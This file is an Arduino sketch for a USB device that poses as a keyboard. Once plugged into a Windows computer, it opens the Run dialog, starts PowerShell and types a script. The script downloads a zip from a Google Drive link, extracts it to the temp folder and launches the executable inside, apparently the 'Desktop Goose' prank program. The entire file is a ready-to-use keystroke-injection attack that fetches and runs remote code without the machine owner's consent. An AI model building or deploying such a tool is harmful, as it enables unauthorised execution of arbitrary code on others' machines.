#include <Keyboard.h>

#define BOOT_DELAY_MS 2000

bool sent = false;


const char* psLines[] = {
  "$downloadUrl = \"https://drive.google.com/uc?export=download&id=19V-8WYSFaZAe3Sps8ID1Pv3VxKElpCG2\"",
  "$tempZip = Join-Path $env:TEMP \"DesktopGoose.zip\"",
  "$extractDir = Join-Path $env:TEMP \"DesktopGoose\"",

  "try {",
  "Invoke-WebRequest -Uri $downloadUrl -OutFile $tempZip -ErrorAction Stop",

  "if (Test-Path $extractDir) {",
  "Remove-Item $extractDir -Recurse -Force",
  "}",

  "Expand-Archive -Path $tempZip -DestinationPath $extractDir -Force -ErrorAction Stop",

  "$exe = Get-ChildItem $extractDir -Recurse -Filter \"GooseDesktop.exe\" -ErrorAction SilentlyContinue | Select-Object -First 1",

  "if ($exe) {",
  "Start-Process $exe.FullName",
  "Write-Host \"Desktop Goose launched.\"",
  "} else {",
  "Write-Host \"GooseDesktop.exe not found.\"",
  "}",

  "} catch {",
  "Write-Host (\"Install failed: \" + $_.Exception.Message)",
  "}"
};

const size_t lineCount = sizeof(psLines) / sizeof(psLines[0]);

void setup() {
  Keyboard.begin();
  delay(BOOT_DELAY_MS);

  // Emulate Win + R to open the Run dialog
  Keyboard.press(KEY_RIGHT_GUI); // Windows Key (GUI key)
  Keyboard.press('r');
  Keyboard.releaseAll(); // Release all keys
  delay(500); // Short delay

  // Type "powershell"
  Keyboard.print("powershell");

  // Press Enter to execute
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(100);


}

void newLine(){
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  delay(50);
  Keyboard.releaseAll();
}

void sendScript() {
  for (size_t i = 0; i < lineCount; i++) {
    Keyboard.print(psLines[i]);  // your existing function
    newLine();               // press Enter / send newline
    delay(50);               // small delay for reliability
  }
}

void loop() {
  if (sent) return;

  delay(1000);
  sendScript();
  
  delay(100);
  Keyboard.press(KEY_RETURN);
  delay(30);
  Keyboard.releaseAll();

  sent = true;
}
     